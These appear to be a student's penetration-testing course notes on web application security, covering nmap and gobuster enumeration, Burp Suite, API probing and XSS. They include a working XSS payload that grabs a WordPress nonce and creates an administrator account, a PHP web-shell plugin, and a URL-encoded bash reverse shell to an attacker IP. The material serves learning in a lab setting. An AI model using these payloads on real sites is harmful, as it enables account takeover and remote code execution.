# Intro to Web Application Security - Clean Notes

## Web Application Testing Models

white box: unconstrained access to source code, infrasturecture and design documentations

black box: no info

## Fingerprinting and Enumeration

web applications

Fingerprinting with nmap

initial active enumeration, enumeration of the web server

sudo nmap -p80 -sV <ip> service discovery on port 80 http port

sudo nmap -p80 --script=http-enum <ip> http enumeration script

gobuster:

directory brute force
dir mode: directory busting
-u: ip flag (url)
-w: brute force word list
-t: thread count, normally 10

gobuster dir -u <ip> -w /usr/share/wordlist/dirb/common.txt -t 5 # Brute-force directories on the target IP using a common wordlist with 5 threads

Proxy tool: intercept requests between web client and server

Proxy tab -> disable intercept tool(intercept tab)->proxy listener settings-> options sub-tab -> enables it on :8080

firefox must connect to 8080 inorder to intercept traffic
Navigate to `about:preferences#general` and set loopback ip address 127.0.0.1:8080

Repeater: new requests or mod the ones in history (replay attack)
rightlick a request in  proxy>HTTP Hisotry -> send to repeater

Intruder: config local /ect/hosts to statically assign ip to offsecwp website that's being tested

bypassing DNS: cat /etc/hosts
...
<ip> offsecwp

in intruder tab, choose the post request, move to positions subtab, need to brute force the password since we know admin is correct

select the value of the pwd key and press add

using rockyou
cat /usr/share/wordlists/rockyou.txt | head

move to playload tab, paste the wordlist into simple list area

Web app enum
refer to the info retrieved passively during recon

ID compoenents that make up web app, many vulnerabilities are technology agnostic
note the db or os

routes make url extensionslargelt irrelevant

source code, resources and content, inspect element

search server responses for additional information

network tool, launched from firefox web developer menu (in the inspect element)

X-Powered-By, x-amz-cd-id: amazon cloud font

need to create a simple pattern file in the system:
{GOBUSTER}/v1
{GOBUSTER}/v2

placeholder for match word

gobuster dir -u <domain> -w /usr/share/wordlists/dirb/big.txt -p pattern

if we find something like admin:
gobuster dir -u <domain>/users/v1/admin -w /usr/share/wordlist/dirb/small.txt

hence enableing us to do something like this:

Cross site scripting

dynamically injecting content into page rendered by user's browser

Stored & Reflected

Reflected: crafted request or link, takes the value and places into page content, exploits $()

DOM based, document object model, browser parse page's html content and generates an interna; dom representation, can be stored or relfected, when browser goes through content injected js is excuted by the DOM

most common input validation check: <> ' " {} ;

<> elements in html
{} js functions
' " for strings
; end of statement

most common are HTML and URL encoding (percent encoding)
convert non ascii and reserved character in URL such as converting space to %20

HTML encoding, display characters what normally have specual meaning, like tag elements &lt: character for \<

if we can inject speical char in the page, browser will treat them as  code element

cookies to track state and info about user, cookies can be set with flags
we're intrested in 2: Secure and HttpOnly

Secure: only send cookie over encrypted connnections such as HTTPS

if above failed maybe try PUT

compress everything into a one liner to inject we use JS compress
https://jscompress.com/

function `encode_to_javascript`(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = `encode_to_javascript`('insert_minified_javascript')
console.log(encoded)

encoding the code from jscompressed so we can send it via curl the above code can be excuted from the browser console since it runs js

gobuster: if i get hit with a 301

## Burp Suite

Burp Suite:
GUI-based for web app security testing
ability to intercept HTTPS traffic (BURP certificate)
burpsuite to launch

Temporary project -> use burp defaults (select)->main UI

new burp session, configure proxy, nav to site with domain name, admin and test as ur and ps, login.
return to burp Proxy>HTTP History, rightclick POST request to the login page, send to intruder

if firefox is burp proxy, burp closed firefox won't work
just use burp build in browser

proxy like burp suite intercepts requests and browser's own network tool

using burp: 
proxy > HTTP History, right click on the request and send to repeater

important: use domain name, ip doesn't work for some reason
proxy is here so that burp can intercept it

viewing it in burp if request seems correct, forward and attack

## Web Application Enumeration

Tech stack id with wappalyzer: passive
OS, UI framwork, webserver etc

tech stacks host os, web server db, front back end language

debugging page:
url address -> file extension as a port of a url can revel programming language: php, jsp, do or html

## HTTP Headers and Sitemap Discovery

http response headers and sitemaps

click on a request to get more details
inspect reponse headers: HTTP headers

X- : non-standard HTTP header
RFC6648: replaced X-

site maps robots.txt tells the search engine bots what to crawl,

we can then inspect the api with curl
: curl -i <domain>/users/v1 # Send a GET request to an API endpoint and include HTTP response headers in output for example
*-i is used to include the http header in the output

var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<username>&email=<email>&pass1=<password>&pass2=<password>&role=administrator";

var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<username>&email=<email>&pass1=<password>&pass2=<password>&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true); 
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);

## API Enumeration and Abuse

Enumerating and Abusing API

gobuster to brute force api (REST)

-p for gobuster pattern feature since api paths are like: /api_name/v1

by probing with curl and reading the returned error code we can determine what language the api uses to interact

curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' <domain>
*-d sepcifiies the data to send to the server via POST

the above commend is to test if the API uses content type json to interact

## Cross-Site Scripting (XSS)

Stored: Presistent XSS. stored in db or cached by server, single stored xss can attack all users, forum software, in comment sections, product reviews anything that is stored and retrieved later

Basic XSS:

verification:
replace the default user agent value with the a script tage that includes the alert method: <script>alert (42)</script>

Prive esc with XSS
steal cookies and session info if app uses an insecure session management config, can steal auth cookie to masquerade

HttpOnly: deny JavaScript access to cookie, can use XSS payload to steal cookie if it is not set

attacking:
curl -i <domain> --<compromised var> "<script>eval(String.fromCharCode(<payload>))</script>" --proxy 127.0.0.1:8080

## Nonce and Admin Account Creation

nonce: server generated token that is included in HTTP request to add randomness and prevent CSRF attacks

to perform admin action need to gather nonce

nonce gathering payload

var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

admin account creation after nonce is gathered

## WordPress Plugin Backdoor & Reverse Shell

reverse shell.php

<?php
/*
Plugin Name: E
Description: Shell
Version: 1.0
Author: A
*/
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

nc -lvnp <port> # Start a netcat listener on specified port to catch reverse shell to listen to reverse shell

reverse shell: http://<targetIP>/wp-admin/plugins/e/e.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/<kaliIP>/4444+0%3E%261%27 # URL-encoded Bash reverse shell payload that connects back to attacker's IP and port this only works with wordpress

## Gobuster Tips

use --exclude-length 0

